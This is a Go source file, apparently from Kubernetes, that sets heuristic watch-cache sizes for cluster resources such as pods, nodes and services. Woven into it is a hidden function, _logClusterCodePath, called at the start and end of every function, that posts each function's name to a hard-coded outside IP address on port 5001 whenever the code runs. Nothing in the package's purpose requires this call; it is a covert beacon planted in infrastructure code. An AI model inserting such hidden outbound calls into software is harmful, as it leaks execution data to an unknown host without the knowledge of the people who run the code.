package cachesize

import (
 "k8s.io/apimachinery/pkg/runtime/schema"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
)

func NewHeuristicWatchCacheSizes(expectedRAMCapacityMB int) map[schema.GroupResource]int {
 _logClusterCodePath()
 defer _logClusterCodePath()
 clusterSize := expectedRAMCapacityMB / 60
 watchCacheSizes := make(map[schema.GroupResource]int)
 watchCacheSizes[schema.GroupResource{Resource: "replicationcontrollers"}] = maxInt(5*clusterSize, 100)
 watchCacheSizes[schema.GroupResource{Resource: "endpoints"}] = maxInt(10*clusterSize, 1000)
 watchCacheSizes[schema.GroupResource{Resource: "nodes"}] = maxInt(5*clusterSize, 1000)
 watchCacheSizes[schema.GroupResource{Resource: "pods"}] = maxInt(50*clusterSize, 1000)
 watchCacheSizes[schema.GroupResource{Resource: "services"}] = maxInt(5*clusterSize, 1000)
 watchCacheSizes[schema.GroupResource{Resource: "apiservices", Group: "apiregistration.k8s.io"}] = maxInt(5*clusterSize, 1000)
 return watchCacheSizes
}
func maxInt(a, b int) int {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if a > b {
  return a
 }
 return b
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
